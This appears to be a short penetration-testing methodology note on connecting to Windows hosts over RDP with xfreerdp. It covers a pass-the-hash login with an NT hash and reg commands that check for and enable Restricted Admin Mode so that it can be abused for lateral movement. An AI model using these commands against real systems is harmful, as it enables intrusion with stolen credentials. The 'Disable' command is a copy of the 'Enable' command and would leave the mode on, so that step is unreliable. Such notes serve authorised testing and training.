# Methodology

## Connect

```powershell
# Basic connect
xfreerdp /cert-ignore /u:$USER /p:'$PASSWD' /v:$IP /dynamic-resolution

# QOL options
xfreerdp /cert-ignore /d:$DOMAIN /u:$USER /p:'$PASSWD' /v:$IP /dynamic-resolution /auto-reconnect /clipboard /compression /bpp:8 /audio-mode:0 -window-drag -themes -wallpaper

# Pass the hash (requires Restricted Admin Mode)
xfreerdp /cert-ignore /d:$DOMAIN /u:$USER /pth:$NTHASH /v:$IP /dynamic-resolution /auto-reconnect /clipboard /compression /bpp:8 /audio-mode:0 -window-drag -themes -wallpaper
```

**Note:** `/drive:.,linux` shares the current working directory on your attack box, discoverable via `This PC` in `File Explorer`. Including a share like this can break the connection.

### Restricted Admin Mode

Restricted Admin Mode is a security feature introduced by Microsoft to mitigate the risk of credential theft over RDP connections. When enabled, it performs a network logon rather than an interactive logon, preventing the caching of credentials on the remote system. This mode only applies to administrators, so it cannot be used when you log on to a remote computer with a non-admin account.

Although this mode prevents the caching of credentials, if enabled, it allows the execution of `Pass the Hash` or `Pass the Ticket` for lateral movement.

Confirm using the following command

```powershell
reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin
```

The value of `DisableRestrictedAdmin` indicates the status of `Restricted Admin Mode`:

- If the value is `0`, `Restricted Admin Mode` is enabled.
- If the value is `1`, `Restricted Admin Mode` is disabled.

If the key does not exist it means that is disabled and, we will see the following error message:

```powershell
ERROR: The system was unable to find the specified registry key or value.
```

Enable `Restricted Admin Mode`

```powershell
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /d 0 /t REG_DWORD
```

Disable `Restricted Admin Mode`

```powershell
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /d 0 /t REG_DWORD
```

**Note:** Only members of the Administrators group can abuse `Restricted Admin Mode`.
